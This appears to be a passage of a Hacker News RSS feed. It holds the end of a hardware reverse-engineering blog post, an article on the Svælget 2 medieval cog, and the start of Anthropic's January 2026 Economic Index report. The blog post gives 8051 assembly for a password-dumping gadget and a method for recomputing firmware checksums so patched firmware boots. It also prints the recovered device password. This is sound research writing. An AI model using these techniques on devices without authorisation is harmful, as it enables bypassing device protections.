    &lt;head rend="h2"&gt;Reading the Password&lt;/head&gt;
    &lt;p&gt;Now that we know the password is located at &lt;code&gt;DAT_EXT_1755&lt;/code&gt;, we want to read it out. On the 8051, &lt;code&gt;DAT_EXT&lt;/code&gt; refers to external memory. In our case, this external memory is actually outside of the core but inside the chip. It acts like additional SRAM. This also means that the encrypted password gets written there during early bootup or initialization. We could try to find this loading using static analysis, but remember that I’m not comfortable reverse engineering this firmware, and I want to demonstrate a more dynamic approach.&lt;/p&gt;
    &lt;p&gt;One could just run a debugger and read the address in it, but remember, we don’t have debug access. However, there’s a workaround: we have control over the flash. If we modify the firmware, we can just write a small gadget that dumps the 11 bytes at &lt;code&gt;DAT_EXT_1755&lt;/code&gt; on UART.&lt;/p&gt;
    &lt;p&gt;Let’s write a print-out gadget in assembly:&lt;/p&gt;
    &lt;code&gt;MOV DPTR, #0x1755    ; 90 17 55 - Point to start address
MOV R6, #11          ; 7E 0B    - Loop counter (11 bytes)

loop:
MOVX A, @DPTR        ; E0       - Read byte from external memory
MOV R7, A            ; FF       - Move to R7 (print function parameter)
LCALL 0x3bed         ; 12 3B ED - Call print function
INC DPTR             ; A3       - Move to next address
DJNZ R6, loop        ; DE FC    - Decrement counter and loop if not zero
&lt;/code&gt;
    &lt;p&gt;This gadget iterates through 11 bytes starting at external memory address &lt;code&gt;0x1755&lt;/code&gt;. For each byte, it reads the value into the accumulator, transfers it to register R7, and calls a print function at &lt;code&gt;CODE:0x3bed&lt;/code&gt; that outputs the value to UART. The DPTR register is incremented after each iteration, and the loop counter in R6 ensures exactly 11 bytes are printed before the loop terminates.&lt;/p&gt;
    &lt;head rend="h3"&gt;Compiling the Gadget&lt;/head&gt;
    &lt;p&gt;To compile this assembly code into binary form, we can use the SDCC (Small Device C Compiler) toolchain. The process involves assembling the source file, linking it, and converting the output to raw binary:&lt;/p&gt;
    &lt;code&gt;# Assemble the code (creates .rel object file)
sdas8051 -losff shellcode.asm

# Link to Intel HEX format
sdld -i shellcode.ihx shellcode.rel

# Convert Intel HEX to raw binary
sdobjcopy -I ihex -O binary shellcode.ihx shellcode.bin
&lt;/code&gt;
    &lt;p&gt;The assembled binary can then be inserted into the firmware at an appropriate location, such as where the branch to the password check function would be. We don’t care if we crash the firmware afterwards, as long as it dumps the password first.&lt;/p&gt;
    &lt;head rend="h3"&gt;Injecting the Gadget&lt;/head&gt;
    &lt;p&gt;But there’s another catch: during bootup, there’s a checksum check. It checks both the “header checksum” and “payload checksum”. I’m not sure which exact addresses are considered “payload,” but if you change any code, the checksum check will probably fail.&lt;/p&gt;
    &lt;p&gt;You can display the header in the SPI viewer mode by pressing &lt;code&gt;v&lt;/code&gt; during bootup. The header is also located at &lt;code&gt;0x1D000&lt;/code&gt; in the dump. The checksum is just a simple sum algorithm (all data gets summed). Let’s say you change some data in the firmware, like changing &lt;code&gt;JNZ&lt;/code&gt; to &lt;code&gt;NOP&lt;/code&gt;: &lt;code&gt;70 21&lt;/code&gt; =&amp;gt; &lt;code&gt;00 00&lt;/code&gt;. Now you have to subtract the changes from the payload checksum. In this case, we have to subtract &lt;code&gt;0x70 + 0x21&lt;/code&gt; from the checksum. So &lt;code&gt;0x04429177&lt;/code&gt; =&amp;gt; &lt;code&gt;0x044290e6&lt;/code&gt;. We have to write the new payload checksum in the header at &lt;code&gt;0x1D00C&lt;/code&gt;. But now we’ve changed the header, so we also need to change the header checksum. I wrote a tiny Python script for that:&lt;/p&gt;
    &lt;code&gt;import struct

# Header values
magic_number = 0x12345678
length = 0x000e320c
payload_checksum = 0x44290e6
reserved = 0x332255ff

# Pack as binary data and sum bytes
data = struct.pack('&amp;gt;IIII', magic_number, length, payload_checksum, reserved)
header_checksum = sum(data) &amp;amp; 0xFFFFFFFF  # 32 bit overflow

print(f"Calculated Header Checksum: 0x{header_checksum:08x}")
&lt;/code&gt;
    &lt;p&gt;Output for the new header checksum will be &lt;code&gt;0x000004c5&lt;/code&gt;. We write this value to &lt;code&gt;0x1D008&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Now you should be able to boot and pass the checksum check. After flashing the modified firmware, the device boots, our gadget runs, and the XORed password bytes are dumped to UART. We can then XOR them with &lt;code&gt;0x5a&lt;/code&gt; to recover the plaintext password:&lt;/p&gt;
    &lt;p&gt;The password is &lt;code&gt;Lx+2035&amp;amp;asp&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;Looking for the password in the flash dump it turns out that it is located at &lt;code&gt;CODE:3e88&lt;/code&gt; XORed with &lt;code&gt;0x5a&lt;/code&gt;, and it gets checked at &lt;code&gt;BANK_10::87ca&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;This project demonstrates that even without debug access, creative hardware-level techniques can provide valuable insights into firmware behavior. By sniffing the SPI flash bus, I was able to create an instruction trace that led me directly to the password validation logic.&lt;/p&gt;
    &lt;p&gt;I’ll be honest: I’m probably not the best reverse engineer, and a more skilled person might have solved this purely through static analysis. At the time I started this, I wasn’t even fully understanding how the banking mechanism worked. I was working in a team environment and wanted to get results quickly, so I tried to achieve the goals with the techniques I knew best: hardware analysis and dynamic observation.&lt;/p&gt;
    &lt;p&gt;This was also my first experiment with the SLogic analyzer, and so far I’m pretty happy to finally have a low-cost capable hardware device for my hobby projects. The Saleae Logic is simply too expensive for hobby use, but I do wish the PulseView software had better performance. Since there’s a PR to get the SiPeed driver upstream, I’m confident that I’ll benefit from ongoing PulseView development rather than being stuck with some fork, as is the case with other logic analyzers that have appeared on the market.&lt;/p&gt;
    &lt;p&gt;Overall, instruction tracing via SPI flash sniffing proved to be an effective technique when traditional debugging methods aren’t available. It’s another tool in the hardware hacker’s arsenal for understanding embedded systems.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46725389</guid><pubDate>Thu, 22 Jan 2026 21:31:59 +0000</pubDate></item><item><title>Viking Ship Museum in Denmark announces the discovery of the largest cog</title><link>https://www.medievalists.net/2025/12/medieval-ship-discovered-copenhagen/</link><description>&lt;doc fingerprint="9e12502444a305a5"&gt;
  &lt;main&gt;
    &lt;p&gt;Maritime archaeologists from the Viking Ship Museum in Denmark have announced the discovery of what they describe as the world’s largest cog—a medieval cargo vessel built around 1410 and found in the waters (Øresund) between Denmark and Sweden.&lt;/p&gt;
    &lt;p&gt;From the first dive, archaeologists realised the outline beneath the sand was not an ordinary shipwreck. As centuries of silt were cleared away, the scale of the vessel became apparent: approximately 28 metres long, 9 metres wide, and 6 metres high, with an estimated cargo capacity of around 300 tons. That size, researchers say, reflects just how large late medieval trading ships could become—and offers a rare chance to examine construction details that are usually lost when only the lower hull survives.&lt;/p&gt;
    &lt;p&gt;“The find is a milestone for maritime archaeology. It is the largest cog we know of, and it gives us a unique opportunity to understand both the construction and life on board the biggest trading ships of the Middle Ages,” says Otto Uldum, maritime archaeologist and excavation leader.&lt;/p&gt;
    &lt;p&gt;The wreck, named Svælget 2 after the channel where it was discovered, was located during seabed investigations connected to Copenhagen’s Lynetteholm development project.&lt;/p&gt;
    &lt;head rend="h3"&gt;A 15th-century ship built for bulk trade&lt;/head&gt;
    &lt;p&gt;Cogs were among the most important workhorses of late medieval shipping, and Svælget 2 appears to represent the type pushed to an extreme. Otto Uldum argues that a ship of this scale points to a trade system that was already highly organised.&lt;/p&gt;
    &lt;p&gt;“A ship with such a large cargo capacity is part of a structured system where merchants knew there was a market for the goods they carried,” he notes. “Svælget 2 is a tangible example of how trade developed during the Middle Ages.”&lt;/p&gt;
    &lt;p&gt;Cogs could be sailed by a relatively small crew, even when heavily loaded, helping merchants move large volumes efficiently. Larger cogs were built to tackle risky routes, including the hazardous voyage around Skagen, travelling from what is now the Netherlands through the Sound and on to Baltic trading towns. Svælget 2, archaeologists suggest, fits squarely into the extensive networks that connected Northern Europe in the 15th century.&lt;/p&gt;
    &lt;p&gt;“It is clear evidence that everyday goods were traded. Shipbuilders went as big as possible to transport bulky cargo – salt, timber, bricks or basic food items,” Uldum adds.&lt;/p&gt;
    &lt;head rend="h3"&gt;Timber from Pomerania and the Netherlands&lt;/head&gt;
    &lt;p&gt;One of the most striking results so far comes from dendrochronology (tree-ring dating). Researchers report that Svælget 2 was built around 1410 using timber sourced from two different regions: Pomerania (in modern-day Poland) and the Netherlands. The planks were made from Pomeranian oak, while the ship’s frames (ribs) came from the Netherlands—an arrangement the team interprets as evidence of complex material supply and specialised shipbuilding capacity.&lt;/p&gt;
    &lt;p&gt;“It tells us that timber exports went from Pomerania to the Netherlands, and that the ship was built in the Netherlands where the expertise to construct these very large cogs was found,” Uldum notes.&lt;/p&gt;
    &lt;head rend="h3"&gt;Unprecedented preservation, with rigging still surviving&lt;/head&gt;
    &lt;p&gt;Svælget 2 is also being presented as an unusually well-preserved cog wreck. Excavated at a depth of 13 metres, it was shielded from many of the destructive forces that normally affect coastal wrecks. Sand is said to have protected the ship’s starboard side “from keel to gunwale,” giving archaeologists access to upper structures and fittings that rarely survive.&lt;/p&gt;
    &lt;p&gt;Among the most important elements are traces of the ship’s rigging—vital components for controlling the sail and supporting the mast.&lt;/p&gt;
    &lt;p&gt;“It is extraordinary to have so many parts of the rigging,” Uldum explains. “We have never seen this before, and it gives us a real opportunity to say something entirely new about how cogs were equipped for sailing.&lt;/p&gt;
    &lt;p&gt;“The finds show how something as complex as the rigging was solved on the largest cogs. Rigging is absolutely central to a medieval ship, as it makes it possible to control the sail, secure the mast and keep the cargo safe. Without ropes and rigging, the ship would be nothing.”&lt;/p&gt;
    &lt;head rend="h3"&gt;The first secure archaeological evidence for cog “castles”&lt;/head&gt;
    &lt;p&gt;Medieval art frequently depicts cogs with high timber-built platforms—“castles”—at the bow and stern. Yet archaeologists have long lacked definitive physical evidence for these structures, largely because wrecks typically preserve only the lower hull. According to the Viking Ship Museum team, Svælget 2 changes that.&lt;/p&gt;
    &lt;p&gt;“We have plenty of drawings of castles, but they have never been found because usually only the bottom of the ship survives,” Uldum says. “This time we have the archaeological proof.”&lt;/p&gt;
    &lt;p&gt;Researchers report extensive remains of a timber-built stern castle, described as a covered deck where crew could shelter from the elements—particularly significant on large merchant voyages.&lt;/p&gt;
    &lt;p&gt;“We now have 20 times as much material to work with. It is not comfort in a modern sense, but it is a big step forward compared to Viking Age ships, which had only open decks in all kinds of weather,” Uldum adds.&lt;/p&gt;
    &lt;head rend="h3"&gt;A brick-built galley and traces of meals at sea&lt;/head&gt;
    &lt;p&gt;Another major surprise is the ship’s brick-built galley, described as the earliest example of its kind from Danish waters. Archaeologists report finding around 200 bricks and 15 tiles, along with bronze cooking pots, ceramic bowls, and food remains.&lt;/p&gt;
    &lt;p&gt;“We have never before seen a brick galley in a medieval ship find from Danish waters. It speaks of remarkable comfort and organisation on board. Now sailors could have hot meals similar to those on land, instead of the dried and cold food that previously dominated life at sea,” says Otto Uldum.&lt;/p&gt;
    &lt;p&gt;In the same area, the team also found hundreds of finely cut sticks that may have been used for stockfish—one more hint of the ship’s provisioning and daily routines.&lt;/p&gt;
    &lt;head rend="h3"&gt;Shoes, combs, rosary beads: everyday life on a merchantman&lt;/head&gt;
    &lt;p&gt;Beyond the ship itself, Svælget 2 has yielded personal and domestic objects that rarely survive in such quantity. The excavation uncovered painted wooden dishes, shoes, combs, and rosary beads, alongside cooking and eating equipment.&lt;/p&gt;
    &lt;p&gt;“The sailor brought his comb to keep his hair neat and his rosary to say his prayers. We have the remains of the pots his food was cooked in and the bowls he ate from. These personal objects show us that the crew brought everyday items with them. They transferred their life on land to life at sea,” explains Otto Uldum.&lt;/p&gt;
    &lt;head rend="h3"&gt;What was Svælget 2 carrying?&lt;/head&gt;
    &lt;p&gt;Despite the ship’s impressive size, archaeologists say they have found no direct trace of the cargo—only items that can be explained as ship’s gear or crew possessions.&lt;/p&gt;
    &lt;p&gt;The archaeologists suggest that cargo stored in an uncovered hold—such as barrels of salt, bundles of cloth, or timber—could have floated away during the sinking. The absence of ballast, the team notes, may indicate the ship was loaded heavily with trade goods when it went down. Even without the cargo, researchers stress that the evidence points to a merchant vessel rather than a warship.&lt;/p&gt;
    &lt;p&gt;“There is no evidence pointing to war or conflict in this ship. None at all,” Uldum stresses.&lt;/p&gt;
    &lt;head rend="h3"&gt;A ship as “a mirror of society”&lt;/head&gt;
    &lt;p&gt;For the researchers, Svælget 2 is not only a technological landmark but also a reflection of late medieval economic capacity—financing, organising, and supplying a vessel of this size required more than individual ambition.&lt;/p&gt;
    &lt;p&gt;“It required a society that could finance, build and equip these enormous ships that served the Middle Ages’ need for export and import over great distances,” says Otto Uldum.&lt;/p&gt;
    &lt;p&gt;“Perhaps the find does not change the story we already know about medieval trade. But it does allow us to say that it was in ships like Svælget 2 that this trade was created. We now know, undeniably, that cogs could be this large – that the ship type could be pushed to this extreme. Svælget 2 gives us a tangible piece of the puzzle and makes it possible to understand how technology and society evolved side by side in an era when shipping was the driving force behind international trade.”&lt;/p&gt;
    &lt;p&gt;The ship’s components are now undergoing conservation at the Brede Works of the National Museum of Denmark.&lt;/p&gt;
    &lt;head rend="h2"&gt;Subscribe to Medievalverse&lt;/head&gt;
    &lt;p/&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46725522</guid><pubDate>Thu, 22 Jan 2026 21:43:14 +0000</pubDate></item><item><title>Anthropic Economic Index economic primitives</title><link>https://www.anthropic.com/research/anthropic-economic-index-january-2026-report</link><description>&lt;doc fingerprint="3e0084fd2d338e6f"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;head rend="h3"&gt;How is AI reshaping the economy?&lt;/head&gt;
    &lt;p&gt;This report introduces new metrics of AI usage to provide a rich portrait of interactions with Claude in November 2025, just prior to the release of Opus 4.5. These “primitives”—simple, foundational measures of how Claude is used, which we generate by asking Claude specific questions about anonymized Claude.ai and first-party (1P) API transcripts—cover five dimensions relevant to AI’s economic impact: user and AI skills, how complex tasks are, the degree of autonomy afforded to Claude, how successful Claude is, and whether Claude is used for personal, educational, or work purposes.&lt;/p&gt;
    &lt;p&gt;The results reveal striking geographic variation, real-world estimates of AI task horizons, and a basis for revised assessments of Claude's macroeconomic impact.&lt;/p&gt;
    &lt;p&gt;The data we release alongside this report are the most comprehensive to date, covering five new dimensions of AI use, consumer and firm use, and country and region breakdowns for Claude.ai.&lt;/p&gt;
    &lt;head rend="h3"&gt;What has changed since our last report&lt;/head&gt;
    &lt;p&gt;In the first chapter, we revisit findings from our previous Economic Index report published in September 2025. We find:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Claude usage remains concentrated among certain tasks, most of them related to coding &lt;lb/&gt;While we see over 3,000 unique work tasks in Claude.ai, the top 10 most common tasks account for 24% of our sampled conversations, a slight increase since our last report. Augmentation patterns (conversations where the user learns, iterates on a task, or gets feedback from Claude) edged to just over half of conversations on Claude.ai. In contrast, automated use remains dominant in 1P API traffic, reflecting its programmatic nature.&lt;/item&gt;
      &lt;item&gt;Global usage remains persistently uneven while US states converge&lt;lb/&gt;The US, India, Japan, the UK, and South Korea lead in overall Claude.ai use. Worldwide, uneven adoption remains well-explained by GDP per capita. Within the US, workforce composition plays a key role in shaping uneven adoption as states with more computer and mathematical professionals show systematically more Claude usage.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;While substantial concentration remains, since our last report Claude usage has become noticeably more evenly distributed across US states. If sustained, usage per capita would be equalized across the country in 2-5 years.&lt;/p&gt;
    &lt;head rend="h3"&gt;Introducing and analyzing our new economic primitives&lt;/head&gt;
    &lt;p&gt;In the second chapter we discuss the motivation for and introduce our new economic primitives, including how they were selected and operationalized, and their limitations. We additionally present evidence that our primitives capture directionally accurate aspects of underlying usage patterns as compared to external benchmarks. In chapters three and four we use these primitives to further investigate implications for adoption and productivity. We find:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Claude use diversifies with higher adoption and income&lt;lb/&gt;While the most common use of Claude is for work, coursework use is highest in countries with the lowest GDP per capita, while rich countries show the highest rates of personal use. This aligns with a simple adoption curve story: early adopters in less developed countries tend to be technical users with specific, high-value applications or use Claude for education, whereas mature markets see usage diversify toward casual and personal purposes.&lt;/item&gt;
      &lt;item&gt;Claude succeeds on most tasks, but less so on the most complex ones&lt;lb/&gt;We find that Claude generally succeeds at the tasks it is given, and that the education level of its responses tends to match the user's input. Claude struggles on more complex tasks: As the time it would take a human to do the task increases, Claude’s success rate falls, much like prominent evals measuring the longest tasks that AIs can reliably perform.&lt;/item&gt;
      &lt;item&gt;Job exposure to AI looks different when success rates are factored in&lt;lb/&gt;We also use the success rate primitive to better understand job exposure to AI, calculating the share of each occupation that Claude can perform by weighting task coverage by both success rates and the importance of each task within the job. For some occupations, like data entry keyers and database architects, Claude shows proficiency in large swaths of the job.&lt;/item&gt;
      &lt;item&gt;Claude is used for higher-skill tasks than those in the broader economy&lt;lb/&gt;The tasks we observe in Claude usage tend to require more education than those in the broader economy. If we assume that AI-assisted tasks diminish as a share of worker responsibilities, removing them would leave behind less-skilled work. But this simple task displacement would not affect white-collar workers uniformly—for some occupations it removes the most skill-intensive tasks, for others the least.&lt;lb/&gt;Without the tasks that we observe Claude performing, travel agents would experience deskilling as complex planning work gives way to routine ticket purchasing and payment collection. Property managers, by contrast, would experience upskilling as bookkeeping tasks give way to contract negotiations and stakeholder management.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;A new window for understanding AI’s impact on the economy&lt;/head&gt;
    &lt;p&gt;These results provide a new window into how AI is currently impacting the economy. Knowing the success rate of tasks gives a more accurate picture of which tasks might be automated, how impacted certain jobs might be, and how labor productivity will change. Measuring differential performance by user education sheds light on inequality effects.&lt;/p&gt;
    &lt;p&gt;Indeed, the close relationship between education levels in inputs and outputs signals that countries with higher educational attainment may be better positioned to benefit from AI, independent of adoption rates alone.&lt;/p&gt;
    &lt;p&gt;This data release aims to enable researchers and the public to better understand the economic implications of AI and investigate the ways in which this transformative technology is already having an effect.&lt;/p&gt;
    &lt;head rend="h2"&gt;Chapter 1: What has changed since our last report&lt;/head&gt;
    &lt;head rend="h3"&gt;Overview&lt;/head&gt;
    &lt;p&gt;Because frontier AI model capabilities are improving rapidly and adoption has been swift, it is important to regularly take stock of changes in how people and businesses are using such systems—and what this usage implies for the broader economy.1&lt;/p&gt;
    &lt;p&gt;In this chapter we analyze how Claude usage and diffusion patterns changed from August 2025 to November 2025 just prior to the release of Opus 4.5. We make four observations:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Usage remains highly concentrated across tasks:&lt;lb/&gt;The ten most common tasks represent 24% of observed usage on Claude.ai, up from 23% in our last report. For first-party (1P) API enterprise customers, concentration among tasks increased more notably: the top ten tasks now represent 32% of traffic, up from 28% in the last report.&lt;/item&gt;
      &lt;item&gt;Augmentation is once again more common than automation on Claude.ai:&lt;lb/&gt;In our previous report we noted that automated use had risen to exceed augmented use on Claude.ai, perhaps capturing both improving capabilities and greater familiarity among users with LLMs. Data from November 2025 points to a broad-based shift back toward augmented use on Claude.ai: The share of conversations classified as augmented jumped 5pp to 52% and the share deemed automated fell 4pp to 45%.2 Product changes during this period—including file creation capabilities, persistent memory, and Skills for workflow customization—may have shifted usage patterns toward more collaborative, human-in-the-loop interactions.&lt;/item&gt;
      &lt;item&gt;Within the US, lower usage states have relatively faster gains in adoption&lt;lb/&gt;Within the US, usage per capita remains largely shaped by how well-matched the workforce is to broader Claude usage: For example, states with a larger share of workers in computer and mathematical occupations tend to have higher usage. Indeed, the top five US states account for nearly half (50%) of all usage despite representing only 38% of the working-age population.&lt;lb/&gt;Nevertheless, there are early signs of rapid regional convergence in adoption: usage has increased relatively faster for states that had lower usage in our last report. If sustained, usage per capita would be equalized across the country in 2-5 years, a pace of diffusion roughly 10x faster than the spread of previous economically consequential technologies in the 20th century.3&lt;lb/&gt;While this is consistent with rapid AI adoption and diffusion, this estimate comes with uncertainty given that it is based on a change observed over a three month period. Diffusion may ultimately proceed more slowly in the months and years to come.&lt;/item&gt;
      &lt;item&gt;Global usage shows little sign of increasing or decreasing regional convergence&lt;lb/&gt;Globally, Claude usage per capita—as captured by the Anthropic AI Usage Index (AUI)—remains highly uneven and strongly correlated with GDP. These gaps are stable: we see no evidence that low-use countries are catching up or that high-use countries are pulling away.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Shifting patterns of usage across tasks and associated occupations&lt;/head&gt;
    &lt;p&gt;Even though frontier LLMs have an impressive range of capabilities relevant to every facet of the modern economy, Claude usage remains very concentrated among a small number of tasks. As compared to nearly one year ago, consumer usage on Claude.ai is modestly more concentrated: The share of conversations assigned to the ten most prevalent O*NET tasks was 24% in November 2025, 1pp higher than in August and up from 21% in January 2025. The most prevalent task in November 2025—modifying software to correct errors—alone represented 6% of usage.&lt;/p&gt;
    &lt;p&gt;In our last Anthropic Economic Index Report we began tracking business adoption patterns by studying Claude usage among 1P API customers. The ten most common tasks grew from 28% of API records in August to 32% in November. Rising concentration among a small set of tasks suggests the highest-value applications continue to generate outsized economic value even as models have become more capable at a wider range of tasks. As with Claude.ai the most common task among API customers was modifying software to correct errors, which accounted for one in ten records.&lt;/p&gt;
    &lt;p&gt;Indeed, computer and mathematical tasks—like modifying software to correct errors—continue to dominate Claude usage overall, representing a third of conversations on Claude.ai and nearly half of 1P API traffic. Such dominance has subsided on Claude.ai: the share of conversations on Claude.ai assigned to such (mostly) coding-related tasks is down from a peak of 40% in March 2025 to 34% in November 2025. At the same time, the share of transcripts assigned to computer and mathematical tasks among 1P API traffic edged higher from 44% in August to 46% in November 2025 (Figure 1.2).&lt;/p&gt;
    &lt;p&gt;The second largest share of Claude.ai usage in November 2025 was in the Educational Instruction and Library category. This corresponds mostly to help with coursework and review, and the development of instructional materials. Such usage has risen steadily since our first report, up from 9% of conversations on Claude.ai in January 2025 to 15% in November.&lt;/p&gt;
    &lt;p&gt;&lt;lb/&gt;The share of usage on Claude.ai for Arts, Design, Entertainment, Sports, and Media tasks increased between August and November 2025 as Claude was used in a growing share of conversations for writing tasks, primarily copyediting and the writing and refinement of fictional pieces. This jump in the prevalence of design- and writing-related tasks reversed a steady decline across earlier reports. For both Claude.ai and API customers, there was a drop in the share of conversations/transcripts where Claude was used for Life, Physical, and Social Science-related tasks.&lt;/p&gt;
    &lt;p&gt;Perhaps the most notable development for API customers was the increase in the share of transcripts associated with Office and Administrative Support related tasks, which rose 3pp in August to 13% in November 2025. Because API use is automation-dominant, this suggests that businesses are increasingly using Claude to automate routine back-office workflows such as email management, document processing, customer relationship management, and scheduling.4&lt;/p&gt;
    &lt;head rend="h3"&gt;Augmentation is again dominant on Claude.ai&lt;/head&gt;
    &lt;p&gt;How AI will affect the economy depends not just on the tasks Claude is used for but the way that users access and engage underlying model capabilities. Since our first report, we have classified conversations into one of five interaction types, which we group into two broader categories: automation and augmentation.5&lt;/p&gt;
    &lt;p&gt;Figure 1.3 plots how automated versus augmented use has evolved over time since we first started collecting this data one year ago. In January 2025, augmented use of Claude was dominant: 56% of conversations were classified as augmentation compared to 41% automated.6 In August 2025, more conversations were classified as automated as compared to augmented.&lt;/p&gt;
    &lt;p&gt;This was a notable development since it suggested that rapid improvements in model capabilities and platform functionality coincided with users increasingly delegating tasks entirely to Claude. This was evident in the “directive” collaboration mode, which is further grouped as automation. Directive conversations are those in which users give Claude a task and it completes it with minimal back-and-forth. From January 2025 to August 2025 the share of such directive conversations rose from 27% to 39%.7&lt;/p&gt;
    &lt;p&gt;Three months later, the share of directive conversations had fallen 7pp to 32% in November 2025 as augmentation once again became more prevalent on Claude.ai than automation. Nevertheless, the automation share was still elevated as compared to nearly one year ago when we first began tracking this measure, suggesting that the underlying trend is still toward greater automation even as the August spike overstated how quickly it was materializing.&lt;/p&gt;
    &lt;p&gt;While we see some evidence of a shift toward soft skill usage on Claude.ai with design, management, and education now higher, the shift back toward augmented use was broad-based in November (Figure 1.4). The rise in augmented use was driven mainly by users iterating with Claude to complete tasks (“task iteration”) rather than asking Claude to explain concepts (“learning”). See Figure 1.5 for common words associated with the three most common interaction modes across O*NET tasks and bottom-up descriptions of requests made of Claude.&lt;/p&gt;
    &lt;head rend="h3"&gt;Persistent regional concentration&lt;/head&gt;
    &lt;p&gt;In our previous report, we introduced the Anthropic AI Usage Index (AUI), a measure of whether Claude is over- or underrepresented in a given geography relative to the size of its working-age population. The AUI is defined as&lt;/p&gt;
    &lt;p&gt;An AUI above 1 indicates that a country uses Claude more intensively than its population alone would predict, while an AUI below 1 indicates lower-than-expected usage. For example, Denmark has an AUI of 2.1, meaning its residents use Claude at roughly twice the rate its share of the global working-age population would suggest.&lt;/p&gt;
    &lt;p&gt;A key fact about Claude usage globally is that it is geographically concentrated: a small number of countries comprise an outsized share of use. From a global perspective, little changed in this respect between August and November 2025. Indeed, the left panel of Figure 1.6 shows that the AUI concentration across countries was essentially unchanged between our last report and this report.&lt;/p&gt;
    &lt;p&gt;By contrast, usage became more evenly distributed across US states from August to November 2025: the Gini coefficient, a standard measure of equality, fell from 0.37 to 0.32. While it is important to exercise caution in interpreting short-run changes, this is a relatively large change toward perfect equality in which the AUI is equal to 1 for all states with a Gini coefficient of 0. If the Gini coefficient for the US again falls by 0.05 every three months, then parity of usage would be reached in roughly two years.&lt;/p&gt;
    &lt;p&gt;What shapes patterns of usage within the US and around the world? In our previous report we emphasized the key role played by income differences globally: Variation in Claude usage across countries is largely accounted for by variation in GDP per capita. In Chapter 3 we revisit the importance of income in shaping not just usage intensity but also patterns of usage around the world.&lt;/p&gt;
    &lt;p&gt;Within the US, income is less clearly a predictor of usage. Instead, what appears to matter most is the composition of each state’s workforce and how well-matched the workforce is to Claude capabilities as reflected in task-level usage. States that have a higher share of workers in computer and mathematical occupations—like Washington D.C., Virginia, and Washington—tend to have higher usage per capita. Quantitatively, each 1% increase in the share of such tech workers in a state is associated with 0.36% higher usage per capita (Figure 1.7). This alone accounts for nearly two-thirds of the cross-state variation in AUI.&lt;/p&gt;
    &lt;p&gt;While we would intuitively expect Claude usage to be higher in states with more tech workers, this pattern holds more generally: Usage per capita is higher in states with more workers in occupations where Claude usage is overrepresented as compared to the US workforce (e.g., Arts, Design, Entertainment, Sports and Media) or with relatively fewer workers in occupations where Claude usage is low as compared to the national economy (e.g., Transportation and Material Moving). This can be seen by calculating the Kullback–Leibler (KL) divergence between the composition of each state’s workforce and the global composition of Claude usage. States with a lower KL divergence—and thus with a workforce that looks more similar to Claude usage patterns—tend to have higher usage per capita.&lt;/p&gt;
    &lt;head rend="h3"&gt;Signs of faster Claude diffusion in the US among low usage states&lt;/head&gt;
    &lt;p&gt;While differences in workforce composition appear to play a role in shaping regional adoption within the US, early evidence suggests Claude is diffusing considerably faster than historical precedent would predict. Economically consequential technologies have historically taken around half a century to achieve full diffusion across the US (Kalanyi et al., 2025). By contrast, comparing Claude adoption rates in November 2025 to three months prior, we estimate that parity in adoption per capita across US states—as measured by the AUI—could be reached within 2–5 years. This estimate comes with a high degree of uncertainty as the precision of our estimates cannot rule out much slower rates of diffusion.&lt;/p&gt;
    &lt;p&gt;We generate this estimate through the lens of a simple model of diffusion, which we briefly describe here. We model diffusion as proportional convergence toward a common steady state of equalized usage per capita in which each state s has an AUI equal to 1:&lt;/p&gt;
    &lt;p&gt;Under this model, the log deviation of AUI from steady state (AUI = 1) shrinks by a factor of β every three months, implying a half-life of ln(.5)/ln(β) quarters. For example, with quarterly data a value of β = 0.99 implies a half-life of about 17 years. To illustrate, starting from an initial AUI of 2, this means AUI would decline to around 1.4 after 17 years and to around 1.1 after 50 years. We take β = 0.99 as a sensible benchmark because it implies a pace of diffusion similar to economically consequential technologies in the 20th century.&lt;/p&gt;
    &lt;p&gt;This model of convergence motivates the following regression specification8:&lt;/p&gt;
    &lt;p&gt;Naively estimating this equation by ordinary least squares (OLS) yields an estimate of β̂ ≈ 0.77. Weighted least squares (WLS) where we weight by each state’s workforce yields an estimate of β̂ ≈ 0.76 (Figure 1.8). Both are statistically distinguishable from 1 at conventional levels. Taken at face value, these estimates imply that it would take little more than two years for each state's AUI to close most of the gap to 1.&lt;/p&gt;
    &lt;p&gt;A concern with estimating convergence this way is that our AUI estimates are subject to sampling noise and other variation unrelated to diffusion. This can produce classical attenuation bias: even if AUI is not actually changing, our estimate of β could end up meaningfully below one.&lt;/p&gt;
    &lt;p&gt;To address this, we estimate the model by two-stage least squares (2SLS), instrumenting the log of AUI in August 2025 with the composition of each state's workforce, measured by its proximity to overall Claude usage patterns. The logic behind this instrument is that workforce composition is a strong predictor of Claude usage (relevance) but being measured independently, is expected to be uncorrelated with sampling noise in our AUI estimates (validity). As noted above, states with more workers in high-Claude-usage roles do tend to have systematically higher usage per capita.&lt;/p&gt;
    &lt;p&gt;The 2SLS estimates imply modestly slower convergence: β̂ ≈ 0.89 unweighted and β̂ ≈ 0.86 when weighting by each state’s working-age population. However, these estimates are less precise, and only the former is statistically distinguishable from 1 at the 10% level. Despite implying a slower convergence than OLS, the 2SLS estimates still imply rapid diffusion: just four to five years for the log deviation of each state's AUI to shrink by 90%.&lt;/p&gt;
    &lt;p&gt;&lt;lb/&gt;That said, our estimates are based on just three months of data. And while the 2SLS specification may help address sampling noise, considerable uncertainty remains. We will revisit this question of the pace of diffusion in future reports.&lt;/p&gt;
